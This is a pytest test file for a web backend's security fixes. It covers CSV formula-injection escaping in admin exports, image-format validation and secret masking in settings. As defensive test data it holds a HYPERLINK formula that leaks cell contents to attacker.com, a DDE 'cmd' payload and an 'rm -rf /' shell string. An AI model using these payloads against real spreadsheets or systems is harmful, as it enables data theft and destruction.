"""Tests for Phase 2: Security and Configuration Fixes.

Covers:
1. CSV formula injection defense in admin CSV exports.
2. WebP image validation, malformed file rejection, and format acceptance/rejection.
3. .env resolution consistency (repo root vs backend dir) and secret masking.
"""
import io
import os
import struct
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient
from PIL import Image

from app.config import (
    Settings,
    _parse_env_line,
    get_settings,
    resolve_dotenv_files,
    _load_dotenv,
)
from app.database import SessionLocal
from app.models import Analysis, AuditLog, User
from app.security.validation import (
    CSV_FORMULA_PREFIXES,
    is_valid_webp,
    sanitize_csv_cell,
    sanitize_csv_row,
    validate_image_bytes,
)


# ---------------------------------------------------------------------------
# Helper image generators
# ---------------------------------------------------------------------------
def _create_minimal_webp() -> bytes:
    """Generate a genuine, valid 1x1 pixel WebP image using Pillow."""
    img = Image.new("RGB", (1, 1), color=(255, 0, 0))
    buf = io.BytesIO()
    img.save(buf, format="WEBP")
    return buf.getvalue()


def _create_minimal_png() -> bytes:
    """Generate a genuine, valid 1x1 pixel PNG image using Pillow."""
    img = Image.new("RGB", (1, 1), color=(0, 255, 0))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _create_minimal_jpeg() -> bytes:
    """Generate a genuine, valid 1x1 pixel JPEG image using Pillow."""
    img = Image.new("RGB", (1, 1), color=(0, 0, 255))
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return buf.getvalue()


# ===========================================================================
# 1. CSV Formula Injection Defense Tests
# ===========================================================================
class TestCsvFormulaInjection:
    @pytest.mark.parametrize(
        "prefix",
        ["=", "+", "-", "@", "\t", "\r"],
    )
    def test_sanitize_csv_cell_escapes_formula_prefixes(self, prefix):
        payload = f"{prefix}cmd|' /C calc'!A0"
        sanitized = sanitize_csv_cell(payload)
        assert isinstance(sanitized, str)
        assert sanitized.startswith("'"), f"Expected leading single quote for prefix {prefix!r}"
        assert sanitized == f"'{payload}"

    def test_sanitize_csv_cell_handles_leading_whitespace_before_formula(self):
        payload = "   =SUM(A1:B10)"
        sanitized = sanitize_csv_cell(payload)
        assert sanitized == f"'{payload}"

    def test_sanitize_csv_cell_preserves_safe_strings(self):
        assert sanitize_csv_cell("normal text") == "normal text"
        # Email contains @ but does NOT begin with @
        assert sanitize_csv_cell("user@trustlayer.com") == "user@trustlayer.com"
        assert sanitize_csv_cell("TrustLayer Security") == "TrustLayer Security"

    def test_sanitize_csv_cell_preserves_non_strings(self):
        assert sanitize_csv_cell(42) == 42
        assert sanitize_csv_cell(-5) == -5
        assert sanitize_csv_cell(3.14159) == 3.14159
        assert sanitize_csv_cell(True) is True
        assert sanitize_csv_cell(False) is False
        assert sanitize_csv_cell(None) == ""

    def test_sanitize_csv_row(self):
        row = [1, "safe text", "=1+1", "@admin", 99.5, "\talert"]
        escaped = sanitize_csv_row(row)
        assert escaped == [1, "safe text", "'=1+1", "'@admin", 99.5, "'\talert"]

    def test_admin_export_audit_logs_csv_escapes_formulas(self, client, admin_headers):
        # Insert audit log with formula injection payloads in various fields
        db = SessionLocal()
        try:
            log = AuditLog(
                user_id=1,
                action="=HYPERLINK(\"http://attacker.com?leak=\"&A1)",
                resource="+cmd|' /C calc'!A0",
                ip="\t10.0.0.1",
                user_agent="@EvilSpreadsheetPayload",
            )
            db.add(log)
            db.commit()
            db.refresh(log)
        finally:
            db.close()

        r = client.get("/api/admin/export/audit-logs/csv", headers=admin_headers)
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/csv")
        content = r.text

        # Verify header is intact
        assert "id,user_id,action,resource,ip,user_agent,created_at" in content

        # Verify formula values are prefixed with single quote
        assert "'=HYPERLINK" in content
        assert "'+cmd|" in content
        assert "'\t10.0.0.1" in content
        assert "'@EvilSpreadsheetPayload" in content

    def test_admin_export_analyses_csv_escapes_formulas(self, client, admin_headers):
        # Insert analysis record with formula injection in threat_type / input_type
        db = SessionLocal()
        try:
            user = db.query(User).filter(User.email == "admin@trustlayer.com").first()
            analysis = Analysis(
                user_id=user.id,
                input_type="=screenshot",
                content_snippet="Test analysis snippet",
                content_hash="mockhash123",
                risk_score=95,
                risk_level="-HIGH",
                threat_type="@PHISHING_ATTACK",
                recommendation="Do not engage with the sender.",
                explanation="Phishing attack detected.",
                campaign_flagged=True,
            )
            db.add(analysis)
            db.commit()
        finally:
            db.close()

        r = client.get("/api/admin/export/analyses/csv", headers=admin_headers)
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/csv")
        content = r.text

        # Verify formula injection is neutralized
        assert "'=screenshot" in content
        assert "'-HIGH" in content
        assert "'@PHISHING_ATTACK" in content

    def test_admin_export_requires_admin_role(self, client, user_headers):
        # Regular user cannot export CSVs
        r1 = client.get("/api/admin/export/audit-logs/csv", headers=user_headers)
        assert r1.status_code == 403
        r2 = client.get("/api/admin/export/analyses/csv", headers=user_headers)
        assert r2.status_code == 403

        # Unauthenticated access rejected
        assert client.get("/api/admin/export/audit-logs/csv").status_code == 401
        assert client.get("/api/admin/export/analyses/csv").status_code == 401


# ===========================================================================
# 2. WebP Image Validation Tests
# ===========================================================================
class TestWebpImageValidation:
    def test_genuine_webp_is_accepted(self):
        webp_bytes = _create_minimal_webp()
        assert is_valid_webp(webp_bytes) is True
        assert validate_image_bytes(webp_bytes) == "webp"

    def test_genuine_png_and_jpeg_are_accepted(self):
        png_bytes = _create_minimal_png()
        jpeg_bytes = _create_minimal_jpeg()
        assert validate_image_bytes(png_bytes) == "png"
        assert validate_image_bytes(jpeg_bytes) == "jpeg"

    def test_reject_truncated_webp(self):
        # Starts with RIFF and WEBP, but length is shorter than claimed RIFF size
        claimed_size = 2000
        header = b"RIFF" + struct.pack("<I", claimed_size) + b"WEBPVP8 " + struct.pack("<I", 100)
        # Payload only has 20 bytes total instead of claimed 2008 bytes
        assert is_valid_webp(header) is False
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(header)

    def test_reject_webp_too_short(self):
        assert is_valid_webp(b"RIFF\x04\x00\x00\x00WEBP") is False
        assert is_valid_webp(b"RIFF") is False
        assert is_valid_webp(b"") is False

    def test_reject_riff_non_webp_containers(self):
        # WAV audio container starting with RIFF
        wav_header = b"RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x02\x00" + b"\x00" * 20
        assert is_valid_webp(wav_header) is False
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(wav_header)

        # AVI video container starting with RIFF
        avi_header = b"RIFF\x24\x00\x00\x00AVI LIST\x10\x00\x00\x00hdrlavih" + b"\x00" * 20
        assert is_valid_webp(avi_header) is False
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(avi_header)

    def test_reject_webp_invalid_chunk_type(self):
        # RIFF ... WEBP ... but chunk is not VP8, VP8L, or VP8X
        fake_webp = b"RIFF\x10\x00\x00\x00WEBPEVIL\x04\x00\x00\x001234"
        assert is_valid_webp(fake_webp) is False
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(fake_webp)

    def test_reject_unsupported_image_formats(self):
        # GIF89a
        gif_bytes = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(gif_bytes)

        # BMP (starts with BM)
        bmp_bytes = b"BM" + b"\x00" * 30
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(bmp_bytes)

        # SVG XML
        svg_bytes = b"<svg xmlns='http://www.w3.org/2000/svg'><circle r='5'/></svg>"
        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(svg_bytes)

    def test_reject_non_image_payloads(self):
        with pytest.raises(ValueError, match="Image payload is empty"):
            validate_image_bytes(b"")

        with pytest.raises(ValueError, match="Unsupported or malformed image"):
            validate_image_bytes(b"#!/bin/bash\nrm -rf /")

    def test_endpoint_accepts_webp_and_rejects_malformed(self, client, user_headers):
        webp_bytes = _create_minimal_webp()

        # Send valid WebP: validator accepts it; endpoint passes it to OCR
        # (503 if tesseract is missing, or 422 if OCR finds no text in blank 1x1 image, but NOT 415)
        r_valid = client.post(
            "/api/analyze/screenshot",
            files={"upload": ("screenshot.webp", io.BytesIO(webp_bytes), "image/webp")},
            headers=user_headers,
        )
        assert r_valid.status_code in (200, 422, 503), f"Unexpected code: {r_valid.status_code}"
        assert r_valid.status_code != 415

        # Send malformed WebP: rejected by validator with 415
        malformed_webp = b"RIFF\x10\x00\x00\x00WEBPEVIL\x04\x00\x00\x001234"
        r_malformed = client.post(
            "/api/analyze/screenshot",
            files={"upload": ("screenshot.webp", io.BytesIO(malformed_webp), "image/webp")},
            headers=user_headers,
        )
        assert r_malformed.status_code == 415
        assert "only PNG, JPEG, and WebP are accepted" in r_malformed.json()["detail"]

        # Send unsupported format (GIF) -> 415
        r_gif = client.post(
            "/api/analyze/screenshot",
            files={"upload": ("animation.gif", io.BytesIO(b"GIF89a..."), "image/gif")},
            headers=user_headers,
        )
        assert r_gif.status_code == 415


# ===========================================================================
# 3. .env Resolution Consistency and Secret Protection Tests
# ===========================================================================
class TestDotenvResolutionAndSecretProtection:
    def test_parse_env_line(self):
        # Clean key-value
        assert _parse_env_line("APP_NAME=TrustLayer Test") == ("APP_NAME", "TrustLayer Test")

        # Unquoted with inline comment
        assert _parse_env_line("APP_ENV=development # local dev") == ("APP_ENV", "development")

        # Quoted with special character (# preserved inside quotes)
        assert _parse_env_line("SECRET_KEY=\"my#secret#key\" # comment") == ("SECRET_KEY", "my#secret#key")
        assert _parse_env_line("ADMIN_PASSWORD='pass#word123' # comment") == ("ADMIN_PASSWORD", "pass#word123")

        # Comments and blanks
        assert _parse_env_line("# full comment") is None
        assert _parse_env_line("   ") is None
        assert _parse_env_line("INVALID_LINE_NO_EQUALS") is None

    def test_resolve_dotenv_files_finds_backend_and_repo_root(self):
        files = resolve_dotenv_files()
        assert isinstance(files, list)
        # Verify the candidate resolver checks backend and repo root paths
        backend_env = Path(__file__).resolve().parents[1] / "backend" / ".env"
        repo_env = Path(__file__).resolve().parents[1] / ".env"

        # At least repo_env or existing .env files are resolved properly
        if repo_env.is_file():
            assert repo_env.resolve() in [f.resolve() for f in files]

    def test_explicit_env_file_priority(self, tmp_path):
        custom_env = tmp_path / "custom.env"
        custom_env.write_text("CUSTOM_TEST_VAR=custom_val\n", encoding="utf-8")

        with patch.dict(os.environ, {"ENV_FILE": str(custom_env)}):
            resolved = resolve_dotenv_files()
            assert resolved[0].resolve() == custom_env.resolve()

    def test_env_precedence_preserves_existing_os_environ(self, tmp_path):
        env_file = tmp_path / ".env"
        env_file.write_text("PREEXISTING_KEY=from_file\nNEW_KEY=from_file\n", encoding="utf-8")

        with patch.dict(os.environ, {"ENV_FILE": str(env_file), "PREEXISTING_KEY": "from_environ"}):
            _load_dotenv()
            # from_environ must NOT be overwritten by from_file
            assert os.environ["PREEXISTING_KEY"] == "from_environ"
            assert os.environ["NEW_KEY"] == "from_file"

    def test_settings_masks_secrets_in_repr(self):
        s = Settings(
            secret_key="super-secret-key-that-must-never-leak",
            admin_password="SuperSecretAdminPassword123!",
            gemini_api_key="AIzaSyGeminiApiKeySecretValue",
            openai_api_key="sk-OpenAiSecretApiKeyVal",
            field_encryption_key="k3Zf84pZ1L0v9X1Y2Z3A4B5C6D7E8F9G0H1I2J3K4L5=",
        )
        repr_str = repr(s)
        str_str = str(s)

        # None of the plaintext secrets should be exposed in representation
        assert "super-secret-key-that-must-never-leak" not in repr_str
        assert "SuperSecretAdminPassword123!" not in repr_str
        assert "AIzaSyGeminiApiKeySecretValue" not in repr_str
        assert "sk-OpenAiSecretApiKeyVal" not in repr_str
        assert "k3Zf84pZ1L0v9X1Y2Z3A4B5C6D7E8F9G0H1I2J3K4L5=" not in repr_str

        assert "super-secret-key-that-must-never-leak" not in str_str
        assert "SuperSecretAdminPassword123!" not in str_str

        # Masking symbol should appear
        assert "***" in repr_str

        # Safe dict should not include secret keys
        safe_dict = s.to_safe_dict()
        assert "secret_key" not in safe_dict
        assert "admin_password" not in safe_dict
        assert "gemini_api_key" not in safe_dict
        assert "field_encryption_key" not in safe_dict
